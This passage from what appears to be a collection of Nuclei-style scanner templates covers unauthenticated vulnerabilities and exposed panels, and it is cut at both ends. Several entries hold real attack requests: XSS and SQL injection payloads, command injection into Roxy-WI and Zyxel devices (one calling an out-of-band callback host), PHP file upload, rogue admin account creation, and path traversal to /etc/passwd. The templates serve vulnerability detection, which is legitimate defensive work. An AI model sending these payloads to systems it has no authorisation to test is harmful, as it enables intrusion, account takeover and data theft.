Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. duration>=6
  2. status_code == 200
  3. contains(content_type, "text/html")
  4. contains(body, "dptTimetable customStyles dptUserStyles")
- condition - and

---

# WordPress GDPR & CCPA \<1.9.27 - Cross-Site Scripting

## Description

- WordPress GDPR & CCPA plugin before 1.9.27 contains a cross-site scripting vulnerability. The check_privacy_settings AJAX action, available to both unauthenticated and authenticated users, responds with JSON data without an "application/json" content-type, and JavaScript code may be executed on a victim's browser.

- severity - medium
- tags - wpscan,cve,cve2022,wordpress,wp-plugin,wp,xss,unauth

## Requests

### Step - 1

```
GET /wp-admin HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=check_privacy_settings&settings%5B40%5D=40&settings%5B41%5D=%3cbody%20onload%3dalert(document.domain)%3e&nonce={{nonce}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_2, 'text/html')
  2. status_code_2 == 200
  3. contains(body_2, '\<body onload=alert(document.domain)>') && contains(body_2, '/wp-content/plugins/')
- condition - and

### Extractors

**Type - regex**

- name - nonce
- part - body
- group - 1
- regex
  1. nonce":"([0-9a-z]+)
- internal - True

---

# WordPress Contact Form 7 \<1.3.6.3 - Stored Cross-Site Scripting

## Description

- WordPress Contact Form 7 before 1.3.6.3 contains an unauthenticated stored cross-site scripting vulnerability in the Drag and Drop Multiple File Upload plugin. SVG files can be uploaded by default via the dnd_codedropz_upload AJAX action.

- severity - medium
- tags - cve,cve2022,xss,wordpress,wp-plugin,wpscan,fileupload,intrusive,unauth

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161

-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="size_limit"

10485760
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="action"

dnd_codedropz_upload
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="type"

click
-----------------------------92633278134516118923780781161
Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.svg"
Content-Type: image/jpeg

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
-----------------------------92633278134516118923780781161--

```

### Step - 2

```
GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.svg HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "alert(document.domain)")
  2. status_code_2 == 200
- condition - and

---

# Roxy-WI \<6.1.1.0 - Remote Code Execution

## Description

- Roxy-WI before 6.1.1.0 is susceptible to remote code execution. System commands can be run remotely via the subprocess_execute function without processing the inputs received from the user in the /app/options.py file.

- severity - critical
- tags - cve,cve2022,rce,unauth,roxy,packetstorm

## Requests

### Step - 1

```
POST /app/options.py HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Origin: {{BaseURL}}
Referer: {{BaseURL}}/app/login.py

alert_consumer=1&serv=127.0.0.1&ipbackend=";cat+/etc/passwd+##&backend_server=127.0.0.1

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# eaSYNC \< 1.1.16 - Unauthenticated Arbitrary File Upload

## Description

- The Free Booking Plugin for Hotels, Restaurant and Car Rental WordPress plugin before 1.1.16 suffers from insufficient input validation which leads to arbitrary file upload and subsequently to remote code execution. An AJAX action accessible to unauthenticated users is affected by this issue. An allowlist of valid file extensions is defined but is not used during the validation steps.

- severity - critical
- tags - cve,cve2022,wpscan,wordpress,easync-booking,unauth,wp,file-upload,wp-plugin,intrusive

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=a0d5959357e474aef655313f69891f37
Content-Type: multipart/form-data; boundary=------------------------98efee55508c5059

--------------------------98efee55508c5059
Content-Disposition: form-data; name="action"

easync_session_store
--------------------------98efee55508c5059
Content-Disposition: form-data; name="type"

car
--------------------------98efee55508c5059
Content-Disposition: form-data; name="with_driver"

self-driven
--------------------------98efee55508c5059
Content-Disposition: form-data; name="driver_license_image2"; filename="{{randstr}}.php"
Content-Type: application/octet-stream

<?php echo md5('CVE-2022-1952');?>

--------------------------98efee55508c5059--

```

### Step - 2

```
GET /wp-admin/admin-ajax.php?action=easync_success_and_save HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID=a0d5959357e474aef655313f69891f37

```

### Step - 3

```
GET /wp-content/uploads/{{filename}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_3, "text/html")
  2. status_code_3 == 200
  3. contains(body_1, 'success\":true')
  4. contains(body_3, 'e0d7fcf2c9f63143b6278a3e40f6bea9')
- condition - and

### Extractors

**Type - regex**

- name - filename
- group - 1
- regex
  1. wp-content\\\/uploads\\\/([0-9a-zA-Z]+).php
- internal - True

---

# MasterStudy LMS plugin \< 2.7.6 - Unauthenticated Admin Account Creation

## Description

- The MasterStudy LMS WordPress plugin before 2.7.6 does to validate some parameters given when registering a new account, allowing unauthenticated users to register as an admin.

- severity - critical
- tags - cve,cve2022,wordpress,wp-plugin,wpscan,wp,unauth

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /wp-admin/admin-ajax.php?action=stm_lms_register&nonce={{nonce}} HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/json

{"user_login":"{{username}}","user_email":"{{user_email}}","user_password":"{{password}}","user_password_re":"{{password}}","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{"wp_capabilities":{"value":{"administrator":1}}}}

```

### Matchers

**Type - word**

- part - body_2
- words
  1. Registration completed successfully
  2. "status":"success"
- condition - and

**Type - word**

- part - header_2
- words
  1. application/json;

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - nonce
- group - 1
- regex
  1. "stm_lms_register":"([0-9a-z]+)"
- internal - True

**Type - kval**

- kval
  1. user_email
  2. password

---

# WordPress Plugin Metform \<= 2.1.3 - Unauthenticated Sensitive Information Disclosure

## Description

- The Metform WordPress plugin is vulnerable to sensitive information disclosure due to improper access control in the ~/core/forms/action.php file which can be exploited by an unauthenticated attacker to view all API keys and secrets of integrated third-party APIs like that of PayPal, Stripe, Mailchimp, Hubspot, HelpScout, reCAPTCHA and many more, in versions up to and including 2.1.3.

- severity - high
- tags - wpscan,cve2022,wordpress,wp-plugin,disclosure,unauth,metform,cve,wp

## Requests

### Step - 1

```
GET /wp-json/metform/v1/forms/templates/0 HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /wp-json/metform/v1/forms/get/{{id}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_2
- words
  1. mf_recaptcha_secret_key
  2. admin_email_from
- condition - and

**Type - word**

- part - header_2
- words
  1. application/json

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - id
- group - 1
- regex
  1. \<option value=\"([0-9]+)\"
- internal - True

---

# Zyxel Firewall - OS Command Injection

## Description

- An OS command injection vulnerability in the CGI program of Zyxel USG FLEX 100(W) firmware versions 5.00 through 5.21 Patch 1, USG FLEX 200 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 500 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 700 firmware versions 5.00 through 5.21 Patch 1, USG FLEX 50(W) firmware versions 5.10 through 5.21 Patch 1, USG20(W)-VPN firmware versions 5.10 through 5.21 Patch 1, ATP series firmware versions 5.10 through 5.21 Patch 1, VPN series firmware versions 4.60 through 5.21 Patch 1, are susceptible to a command injection vulnerability which could allow an attacker to modify specific files and then execute some OS commands on a vulnerable device.

- severity - critical
- tags - zyxel,cve,cve2022,firewall,unauth,kev,msf,rce

## Requests

### Step - 1

```
POST /ztp/cgi-bin/handler HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; curl {{interactsh-url}};","data":"hi"}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - status**

- status
  1. 500

---

# WP Visitor Statistics (Real Time Traffic) \< 5.8 - Unauthenticated SQLi

## Description

- Unauthenticated SQL Injection (SQLi) vulnerabilities in Osamaesh WP Visitor Statistics plugin \<= 5.7 at WordPress.

- severity - critical
- tags - cve,cve2022,wordpress,wp-plugin,wp,unauth,sqli,wp-stats-manager

## Requests

### Step - 1

```
@timeout: 15s
GET /?wmcAction=wmcTrack&url=test&uid=0&pid=0&visitorId=1331'+and+sleep(5)+or+' HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. duration>=5

**Type - regex**

- regex
  1. ^1331' and sleep\(5\) or '$

**Type - status**

- status
  1. 200

---

# BadgeOS \< 3.7.1 - Unauthenticated SQL Injection

## Description

- The BadgeOS WordPress plugin through 3.7.0 does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action, leading to an SQL Injection exploitable by unauthenticated users.

- severity - critical
- tags - cve2022,wp,unauth,sqli,cve,wp-plugin,badgeos,wpscan,wordpress

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=get-achievements&total_only=true&user_id=11 UNION ALL SELECT NULL,CONCAT(1,md5({{num}}),1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -

```

### Matchers

**Type - dsl**

- dsl
  1. status_code == 200
  2. contains(body, md5(num))
  3. contains(content_type, "application/json")
  4. contains(body, "badgeos-arrange-buttons")
- condition - and

---

# WordPress Narnoo Distributor \<=2.5.1 - Local File Inclusion

## Description

- WordPress Narnoo Distributor plugin 2.5.1 and prior is susceptible to local file inclusion. The plugin does not validate and sanitize the lib_path parameter before being passed into a call to require() via the narnoo_distributor_lib_request AJAX action, and the content of the file is displayed in the response as JSON data. This can also lead to a remote code execution vulnerability depending on system and configuration.

- severity - critical
- tags - narnoo-distributor,cve,cve2022,wordpress,wp-plugin,wpscan,wp,rce,unauth,lfi

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

action=narnoo_distributor_lib_request&lib_path=/etc/passwd

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Dynamicweb 9.5.0 - 9.12.7 Unauthenticated Admin User Creation

## Description

- Dynamicweb contains a vulnerability which allows an unauthenticated attacker to create a new administrative user.
- severity - critical
- tags - cve,cve2022,dynamicweb,rce,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername={{rand_base(6)}}&adminpassword={{rand_base(6)}}&adminemail=test@test.com&adminname=test

### Matchers

**Type - word**

- part - body
- words
  1. "Success": true
  2. "Success":true
- condition - or

**Type - word**

- part - header
- words
  1. application/json
  2. ASP.NET_SessionId
- condition - and
- case-insensitive - True

**Type - status**

- status
  1. 200

---

# Page Views Count \< 2.4.15 - Unauthenticated SQL Injection

## Description

- Unauthenticated SQL Injection in WordPress Page Views Count Plugin (versions \< 2.4.15).

- severity - critical
- tags - cve,cve2022,wordpress,wp-plugin,wp,sqli,wpscan,unauth

## Requests

### Step - 1

```
GET /?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5({{num}}),null,null%20--%20g HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. {{md5(num)}}

**Type - status**

- status
  1. 200

---

# muhttpd \<= 1.1.5 - Path traversal

## Description

- A Path traversal vulnerability exists in versions muhttpd 1.1.5 and earlier. The vulnerability is directly requestable to files within the file system.

- severity - high
- tags - cve,cve2022,network,muhttpd,lfi,unauth

---

# Apache ShenYu Admin Unauth Access

## Description

- Apache ShenYu suffers from an unauthorized access vulnerability where a user can access /plugin api without authentication. This issue affected Apache ShenYu 2.4.0 and 2.4.1.
- severity - critical
- tags - cve,cve2022,shenyu,unauth,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/plugin

### Matchers

**Type - word**

- part - body
- words
  1. "message":"query success"
  2. "code":200
- condition - and

**Type - status**

- status
  1. 200

---

# BigAnt Server v5.6.06 - Improper Access control

## Description

- BigAnt Server v5.6.06 suffers from Use of Password Hash With Insufficient Computational Effort.

- severity - medium
- tags - cve,cve2022,bigant,unauth,exposure

## Requests

- Method - GET

### URL

- {{BaseURL}}/Runtime/Data/ms_admin.php

### Matchers

**Type - word**

- part - body
- words
  1. "user_name";
  2. "user_pwd";
  3. "user_id";
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Casdoor 1.13.0 - Unauthenticated SQL Injection

## Description

- Casdoor version 1.13.0 suffers from a remote unauthenticated SQL injection vulnerability via the query API in Casdoor before 1.13.1 related to the field and value parameters, as demonstrated by api/get-organizations.
- severity - high
- tags - sqli,unauth,packetstorm,edb,cve,cve2022,casdoor

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),1)

### Matchers

**Type - regex**

- part - body
- regex
  1. XPATH syntax error.\*&#39
  2. casdoor
- condition - and

**Type - status**

- status
  1. 200

---

# ARPrice Lite \< 3.6.1 - Unauthenticated SQLi

## Description

- The Pricing Table WordPress plugin before 3.6.1 fails to properly sanitize and escape user supplied POST data before it is being interpolated in an SQL statement and then executed via an AJAX action available to unauthenticated users.

- severity - critical
- tags - unauth,wp,cve2022,wordpress,wp-plugin,arprice-responsive-pricing-table,sqli,wpscan,cve

## Requests

### Step - 1

```
@timeout: 10s
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=arplite_insert_plan_id&arp_plan_id=x&arp_template_id=1+AND+(SELECT+8948+FROM+(SELECT(SLEEP(6)))iIic)

```

### Step - 2

```
GET /wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. duration_1>=6
  2. status_code_1 == 200
  3. contains(content_type_1, "text/html")
  4. contains(body_2, "ArpPriceTable")
- condition - and

---

# Horde Groupware Unauthenticated Admin Access

## Description

- Horde Groupware contains an administrative account with a blank password, which allows remote attackers to gain access.
- severity - critical
- tags - cve,cve2005,horde,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/horde/admin/user.php
- {{BaseURL}}/admin/user.php

### Matchers

**Type - word**

- words
  1. \<title>Horde :: User Administration\</title>

**Type - status**

- status
  1. 200

---

# Bonita BPM Portal \<6.5.3 - Local File Inclusion

## Description

- Bonita BPM Portal before 6.5.3 allows remote attackers to read arbitrary files via a .. (dot dot) in the theme parameter and a file path in the location parameter to bonita/portal/themeResource.
- severity - high
- tags - unauth,packetstorm,cve,cve2015,bonita,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=etc/passwd
- {{BaseURL}}/bonita/portal/themeResource?theme=portal/../../../../../../../../../../../../../../../../&location=Windows/win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

**Type - regex**

- regex
  1. root:[x*]:0:0:

---

# Manage Engine AD Search

## Description

- Manage Engine AD Manager service can be configured to allow anonymous users to browse the AD list remotely.
- severity - high
- tags - unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/ADSearch.cc?methodToCall=search

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. ManageEngine
  2. ADManager
- condition - and

---

# Apache Druid Unauth

- severity - low
- tags - misconfig,druid,unauth,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/unified-console.html

### Matchers

**Type - word**

- words
  1. \<title>Apache Druid\</title>

**Type - status**

- status
  1. 200

---

# Clockwork Dashboard Exposure

- severity - high
- tags - exposure,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/\_\_clockwork/latest

### Matchers

**Type - word**

- words
  1. "id":
  2. "version":
  3. "method":
  4. "url":
  5. "time":
- part - body
- condition - and

**Type - word**

- words
  1. application/json
- part - header

---

# Seeyon Unauthoried Access

- severity - high
- tags - misconfig,seeyon,unauth

## Requests

### Step - 1

```
POST /seeyon/thirdpartyController.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: deflate

method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4

```

### Step - 2

```
GET /seeyon/main.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Encoding: deflate
Content-Type: application/x-www-form-urlencoded
Cookie: {{session}}

```

### Matchers

**Type - word**

- part - body
- words
  1. 当前已登录了一个用户，同一窗口中不能登录多个用户
  2. \<a href='/seeyon/main.do?method=logout'
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - session
- part - header
- internal - True
- regex
  1. JSESSIONID=(.\*)

---

# Mongo Express - Unauthenticated Access

## Description

- Mongo Express was able to be access with no authentication requirements in place.
- severity - high
- tags - mongo,unauth,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}
- {{BaseURL}}/mongo-express/
- {{BaseURL}}/db/admin/system.users

### Matchers

**Type - word**

- words
  1. \<title>Home - Mongo Express\</title>
  2. \<title>system.users - Mongo Express\</title>
- condition - or

**Type - status**

- status
  1. 200

---

# Jupyter ipython - Authorization Bypass

## Description

- Jupyter was able to be accessed without authentication.
- severity - critical
- tags - unauth,jupyter

## Requests

- Method - GET

### URL

- {{BaseURL}}/ipython/tree

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. ipython/static/components
  2. ipython/kernelspecs
- part - body

---

# Salesforce Lightning - API Detection

## Description

- A Salesforce Lightning aura API was detected.
- severity - info
- tags - aura,unauth,salesforce,exposure

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/aura
- {{BaseURL}}/s/sfsites/aura
- {{BaseURL}}/sfsites/aura
- {{BaseURL}}/s/aura
- {{BaseURL}}/s/fact
  - {}

### Matchers

**Type - word**

- part - body
- words
  1. aura:invalidSession

---

# Exposed Docker API

- severity - info
- tags - docker,unauth,devops

## Requests

- Method - GET

### URL

- http://{{Hostname}}/version
- http://{{Hostname}}/v1.24/version

### Matchers

**Type - word**

- words
  1. application/json
- part - header

**Type - word**

- words
  1. KernelVersion
  2. BuildTime
- condition - and
- part - body

**Type - status**

- status
  1. 200

---

# Druid Monitor Unauthorized Access

- severity - high
- tags - druid,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/druid/index.html

### Matchers

**Type - word**

- words
  1. Druid Stat Index\</title>

**Type - status**

- status
  1. 200

---

# Exposed Browserless debugger

## Description

- Browserless instance can be used to make web requests. May worth checking /workspace for juicy files.
- severity - medium
- tags - browserless,unauth,debug

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- part - body
- words
  1. \<title>browserless debugger\</title>
  2. \<code>Click the ► button to run your code.\</code>
- condition - or

**Type - status**

- status
  1. 200

---

# Unauthenticated Fastvue Dashboard

- severity - medium
- tags - panel,fastvue,unauth,misconfig

## Requests

- Method - GET

### URL

- {{BaseURL}}/dashboard.aspx

### Matchers

**Type - word**

- words
  1. \<title>Fastvue Sophos Reporter\</title>
  2. \<title>Fastvue Reporter for SonicWall\</title>
- condition - or

**Type - word**

- part - body
- words
  1. Dashboard

**Type - status**

- status
  1. 200

---

# Exposed Kibana

- severity - medium
- tags - kibana,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}
- {{BaseURL}}/app/kibana/

### Matchers

**Type - word**

- words
  1. kibanaWelcomeView
  2. cluster_uuid
  3. kibanaWelcomeLogo
  4. kibanaWelcomeTitle

**Type - status**

- status
  1. 200

---

# etcd Unauthenticated HTTP API Leak

- severity - high
- tags - hackerone,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/v2/auth/roles

### Matchers

**Type - word**

- words
  1. "roles"
  2. "permissions"
  3. "role"
  4. "kv"
- condition - and
- part - body

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. text/plain

---

# Kubeflow Unauth

- severity - high
- tags - kubeflow,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/pipeline/apis/v1beta1/runs?page_size=5&sort_by=created_at%20desc

### Matchers

**Type - word**

- words
  1. {"runs":[{"id":
  2. resource_references
- condition - and
- part - body

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# HPE System Management Anonymous Access

- severity - low
- tags - hp,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/chpstrt.php?chppath=Home

### Matchers

**Type - word**

- condition - and
- words
  1. username = "hpsmh_anonymous";
  2. var host_addr = '
  3. var ip_addr = '

---

# JBoss Management Console Server Information

- severity - low
- tags - jboss,unauth,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/web-console/ServerInfo.jsp

### Matchers

**Type - word**

- words
  1. Application Server
  2. Management Console
- condition - and

**Type - status**

- status
  1. 200

---

# Glowroot Anonymous User

## Description

- Anonymous user access allows to understand the host internals
- severity - high
- tags - misconfig,unauth,glowroot

## Requests

- Method - GET

### URL

- {{BaseURL}}/backend/admin/users?username=anonymous

### Matchers

**Type - word**

- words
  1. "username":"anonymous"
  2. "Administrator"
  3. "newPassword":""
- condition - and

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# ElasticSearch Information Disclosure

- severity - low
- tags - elastic,unauth,elasticsearch

## Requests

- Method - GET

### URL

- {{BaseURL}}/?pretty
- {{BaseURL}}/\_cat/indices?v
- {{BaseURL}}/\_all/\_search

### Matchers

**Type - word**

- words
  1. "took":
  2. "number" :
- condition - or

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. "number"\s:\s"([0-9.]+)"

---

# Zenphoto Installation Sensitive Information

## Description

- Misconfiguration on Zenphoto version \< 1.5.X which lead to sensitive information disclosure
- severity - medium
- tags - unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/zenphoto/zp-core/setup/index.php
- {{BaseURL}}/zp/zp-core/setup/index.php
- {{BaseURL}}/gallery/zp-core/setup/index.php
- {{BaseURL}}/zp-core/setup/index.php

### Matchers

**Type - word**

- words
  1. Welcome to Zenphoto! This page will set up Zenphoto
- part - body

**Type - word**

- words
  1. text/html
- part - header

**Type - status**

- status
  1. 200

---

# Zipkin Discovery

## Description

- Unauthenticated access to Zipkin was discovered.
- severity - high
- tags - unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/config.json

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. application/json
- part - header

**Type - word**

- words
  1. environment
  2. defaultLookback
- part - body
- condition - and

---

# Unauthenticated Etherpad

## Description

- Finds Etherpad instances that allow adding new notes without authentication.

- severity - low
- tags - etherpad,misconfig,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- part - body
- words
  1. index.createOpenPad
  2. index.newPad
- condition - and

**Type - status**

- status
  1. 200

---

# Apache Hadoop - Yarn ResourceManager Remote Code Execution

## Description

- An unauthenticated Hadoop Resource Manager was discovered, which allows remote code execution by design.

- severity - critical
- tags - vulhub,apache,hadoop,unauth,rce,msf

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/ws/v1/cluster/apps/new-application

### Matchers

**Type - word**

- words
  1. "application-id"

**Type - status**

- status
  1. 200

---

# Wavlink Panel - Unauthenticated Access

## Description

- Wavlink Panel was able to be accessed with no authentication requirements in place.
- severity - high
- tags - exposure,wavlink,unauth,misconfig,router

## Requests

- Method - GET

### URL

- {{BaseURL}}/wifi_base.shtml

### Matchers

**Type - word**

- part - body
- words
  1. \<title>APP\</title>

**Type - regex**

- part - body
- regex
  1. var passphraseKey12="(.\*)";

**Type - word**

- part - body
- negative - True
- words
  1. var passphraseKey12="";

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. var passphraseKey12="(.\*)";

---

# Dgraph Ratel Dashboard Exposure

- severity - low
- tags - exposure,unauth,panel

## Requests

- Method - GET

### URL

- {{BaseURL}}/?dev

### Matchers

**Type - word**

- part - body
- words
  1. Choose a version of the Ratel interface
  2. \<title>Dgraph Ratel Dashboard\</title>
- condition - and

**Type - word**

- part - header
- words
  1. text/html

---

# Unauthenticated Selenium Grid Console

- severity - info
- tags - misconfig,unauth,selenium

## Requests

- Method - GET

### URL

- {{BaseURL}}/grid/console
- {{BaseURL}}/console

### Matchers

**Type - word**

- part - body
- words
  1. Grid Console
  2. view config
- condition - and

**Type - status**

- status
  1. 200

---

# Unauthenticated Netdata

- severity - medium
- tags - netdata,unauth,misconfig

## Requests

- Method - GET

### URL

- {{BaseURL}}/api/v1/data?chart=system.cpu&format=json&points=125&group=average&gtime=0&options=ms%7Cflip%7Cjsonwrap%7Cnonzero&after=-120&dimensions=iowait

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. view_update_every
  2. dimensions
- condition - and

**Type - word**

- words
  1. application/json
- part - header

---

# Alibaba Mongoshake Unauth

- severity - info
- tags - mongoshake,unauth,alibaba

## Requests

- Method - GET

### URL

- {{BaseURL}}/

### Matchers

**Type - word**

- words
  1. {"Uri":"/worker","Method":"GET"}

**Type - word**

- words
  1. text/plain
- part - header

**Type - status**

- status
  1. 200

---

# H3C Server - Unauthenticated Access

## Description

- H3C server was able to be accessed with no authentication requirements in place.
- severity - high
- tags - h3c,default-login,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin

### Matchers

**Type - word**

- part - body
- words
  1. admin
  2. 审计管理员
  3. 错误的 id
- condition - and

**Type - status**

- status
  1. 200

---

# zabbix-dashboards-access

## Description

- zabbix-dashboards-access guest login credentials were successful.
- severity - medium
- tags - edb,packetstorm,zabbix,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/zabbix/zabbix.php?action=dashboard.list

### Matchers

**Type - word**

- words
  1. Create dashboard
  2. Zabbix SIA
- condition - and

**Type - status**

- status
  1. 200

---

# Unauthenticated Lansweeper Instance

- severity - high
- tags - lansweeper,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/Default.aspx

### Matchers

**Type - word**

- words
  1. Main page - Lansweeper

---

# PRTG Traffic Grapher - Unauthenticated Access

## Description

- PRTG Traffic Grapher was able to be accessed with no authentication requirements in place.
- severity - high
- tags - config,unauth,prtg,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/sensorlist.htm

### Matchers

**Type - word**

- words
  1. PRTG Traffic Grapher
- condition - and

**Type - status**

- status
  1. 200

---

# Nacos 1.x - Authentication Bypass

## Description

- Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.
- severity - critical
- tags - nacos,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9
- {{BaseURL}}/v1/auth/users?pageNo=1&pageSize=9

### Matchers

**Type - word**

- words
  1. Content-Type: application/json
- part - header

**Type - regex**

- regex
  1. "username":
  2. "password":
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# Zhiyuan Oa Unauthorized

- severity - low
- tags - seeyon,unauth,zhiyuan

## Requests

- Method - GET

### URL

- {{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile

### Matchers

**Type - word**

- words
  1. serverIdentifier
  2. companyName
- condition - and

**Type - word**

- words
  1. application/json
- part - header

**Type - status**

- status
  1. 200

---

# Unauthenticated Mercurial Detect

- severity - high
- tags - misconfig,unauth,mercurial

## Requests

- Method - GET

### URL

- {{BaseURL}}

### Matchers

**Type - word**

- part - body
- words
  1. Mercurial Repositories
  2. Last modified
- condition - and

**Type - status**

- status
  1. 200

---

# Docker Container - Misconfiguration Exposure

## Description

- A Docker container misconfiguration was discovered. The Docker daemon can listen for Docker Engine API requests via three different types of Socket - unix, tcp, and fd. With tcp enabled, the default setup provides un-encrypted and un-authenticated direct access to the Docker daemon. It is conventional to use port 2375 for un-encrypted, and port 2376 for encrypted communication with the daemon.
- severity - critical
- tags - docker,unauth,devops

## Requests

- Method - GET

### URL

- {{BaseURL}}/images/json

### Matchers

**Type - word**

- words
  1. "ParentId":
  2. "Container":
  3. "Labels":
- condition - and

**Type - status**

- status
  1. 200

---

# PinPoint Unauth

- severity - high
- tags - pippoint,unauth

## Requests

- Method - GET

### URL

